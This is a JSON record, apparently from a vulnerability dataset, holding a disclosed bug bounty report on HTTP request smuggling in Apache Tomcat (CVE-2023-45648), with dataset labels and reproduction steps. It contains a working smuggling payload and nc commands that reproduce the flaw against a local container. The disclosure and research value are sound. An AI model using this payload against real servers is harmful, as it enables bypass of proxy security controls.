@@ -1,0 +1,38 @@
+{
+  "reported_to": "Internet Bug Bounty",
+  "reported_by": "mukeran ",
+  "title": "Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)",
+  "content": "\nApache Tomcat supports Trailer Section. However, we found that in version prior than 11.0.0-M11, 10.1.13, 9.0.80, 8.5.93, Apache Tomcat cannot properly parse the trailer section if there's no colon in the trailer header's line. It will skip the following lines until the last line with a valid colon-separated key-value header pair, which can be leveraged to perform HTTP request smuggling.\nIf we send the following payload, the headers of the second request (Line 12-15) will be regarded as the trailer section of the first request, while the content of the second request (Line 17-19) is processed as the second request. When sending this payload to other HTTP implementations such as NGINX, Line 12-21 would be the second request.\nCode 246 Bytes\n1POST /benign_path HTTP/1.1\n2Host: a.com\n3Connection: keep-alive\n4Transfer-Encoding: chunked\n5\n65\n712345\n80\n9Content: hello\n10a\n11\n12POST /benign_path HTTP/1.1\n13Host: a.com\n14Connection: keep-alive\n15Content-Length: 37\n16\n17GET /evil_path HTTP/1.1\n18Any: any\n19Host: b.com\n20\n21\nReproduce:\nCode 482 Bytes\n1docker run -d --name hrs_tomcat_11 -p 43022:8080 tomcat:10.1.13\n2echo -n 'POST /benign_path HTTP/1.1\\r\\nHost: a.com\\r\\nConnection: keep-alive\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n5\\r\\n12345\\r\\n0\\r\\nContent: hello\\r\\na\\r\\n\\r\\nPOST /benign_path HTTP/1.1\\r\\nHost: a.com\\r\\nConnection: keep-alive\\r\\nContent-Length: 37\\r\\n\\r\\nGET /evil_path HTTP/1.1\\r\\nAny: any\\r\\nHost: b.com\\r\\n\\r\\n' | nc 127.0.0.1 43022\n3docker exec -it hrs_tomcat_11 /bin/sh -c \"cat /usr/local/tomcat/logs/localhost*\"\nAccess log:\nCode 164 Bytes\n1192.168.215.1 - - [30/Dec/2023:10:42:00 +0000] \"POST /benign_path HTTP/1.1\" 404 683\n2192.168.215.1 - - [30/Dec/2023:10:42:00 +0000] \"GET /evil_path HTTP/1.1\" 404 683\nThe screenshot of emails between Apache Tomcat Security Team and me is uploaded as the attachment.\nImpact\nIt can be leveraged to perform HTTP request smuggling in order to bypass security mechanisms when Apache Tomcat is deployed behind a reverse proxy.\n\n",
+  "severity": [
+    8.2,
+    null
+  ],
+  "bounty": 4660,
+  "weaknesses": [
+    "HTTP Request Smuggling"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1707313860,
+  "report_url": "https://hackerone.com/reports/2299692",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Run a vulnerable version of Apache Tomcat (prior to 11.0.0-M11, 10.1.13, 9.0.80, or 8.5.93) using Docker: `docker run -d --name hrs_tomcat_11 -p 43022:8080 tomcat:10.1.13`"
+    ],
+    [
+      2,
+      "Send a crafted HTTP request with malformed trailer headers and a smuggled request: `echo -n 'POST /benign_path HTTP/1.1\\r\\nHost: a.com\\r\\nConnection: keep-alive\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n5\\r\\n12345\\r\\n0\\r\\nContent: hello\\r\\na\\r\\n\\r\\nPOST /benign_path HTTP/1.1\\r\\nHost: a.com\\r\\nConnection: keep-alive\\r\\nContent-Length: 37\\r\\n\\r\\nGET /evil_path HTTP/1.1\\r\\nAny: any\\r\\nHost: b.com\\r\\n\\r\\n' | nc 127.0.0.1 43022`"
+    ]
+  ],
+  "vuln_description": "Apache Tomcat versions prior to 11.0.0-M11, 10.1.13, 9.0.80, and 8.5.93 improperly parse HTTP trailer sections when a trailer header line lacks a colon. This allows an attacker to smuggle HTTP requests by crafting a request where subsequent headers are misinterpreted as part of the trailer section, potentially bypassing security mechanisms when Tomcat is behind a reverse proxy.",
+  "reason": "The vulnerability requires understanding of HTTP trailer sections and chunked transfer encoding, but the attack itself is straightforward once the parsing flaw is identified. The interaction between the malformed trailer and request smuggling is non-obvious but doesn't involve complex application states or novel logic.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
